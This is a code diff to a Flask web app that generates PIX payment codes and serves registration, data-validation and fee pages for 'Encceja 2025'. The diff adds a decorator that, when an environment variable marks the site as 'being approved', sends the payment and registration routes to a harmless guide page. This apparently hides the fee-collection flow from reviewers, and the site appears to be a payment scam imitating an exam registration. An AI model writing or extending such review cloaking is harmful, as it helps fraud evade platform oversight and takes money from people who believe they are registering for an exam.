@@ -35,6 +35,21 @@ def check_referer(f):
         
     return decorated_function
 
+def check_esta_aprovando(f):
+    @functools.wraps(f)
+    def decorated_function(*args, **kwargs):
+        # Verificar se a variável de ambiente ESTA_APROVANDO está definida como "true"
+        esta_aprovando = os.environ.get("ESTA_APROVANDO", "").lower() == "true"
+        
+        if esta_aprovando:
+            app.logger.info(f"ESTA_APROVANDO ativado: Redirecionando {request.path} para guia informativo ENCCEJA")
+            return render_template('encceja_info_guide.html')
+        
+        # Se não estiver no modo de aprovação, continuar com a rota normal
+        return f(*args, **kwargs)
+        
+    return decorated_function
+
 # Se não existir SESSION_SECRET, gera um valor aleatório seguro
 if not os.environ.get("SESSION_SECRET"):
     os.environ["SESSION_SECRET"] = secrets.token_hex(32)
@@ -459,6 +474,7 @@ def generate_qr_code(pix_code: str) -> str:
 @app.route('/')
 @app.route('/index')
 @check_referer
+@check_esta_aprovando
 def index():
     try:
         # Get data from query parameters for backward compatibility
@@ -591,6 +607,7 @@ def index():
 
 @app.route('/payment')
 @check_referer
+@check_esta_aprovando
 def payment():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX...")
@@ -716,6 +733,7 @@ def payment():
 
 @app.route('/payment-update')
 @check_referer
+@check_esta_aprovando
 def payment_update():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")
@@ -1434,16 +1452,19 @@ def send_test_sms():
         return redirect(url_for('sms_config'))
 
 @app.route('/encceja')
+@check_esta_aprovando
 def encceja():
     """Página do Encceja 2025"""
     return render_template('encceja.html')
 
 @app.route('/inscricao')
+@check_esta_aprovando
 def inscricao():
     """Página de inscrição do Encceja 2025"""
     return render_template('inscricao.html')
 
 @app.route('/validar-dados')
+@check_esta_aprovando
 def validar_dados():
     """Página de validação de dados do usuário"""
     return render_template('validar_dados.html')
@@ -1469,6 +1490,7 @@ def encceja_info():
     return render_template('encceja_info.html')
 
 @app.route('/pagamento', methods=['GET', 'POST'])
+@check_esta_aprovando
 def pagamento_encceja():
     """Página de pagamento da taxa do Encceja"""
     if request.method == 'POST':
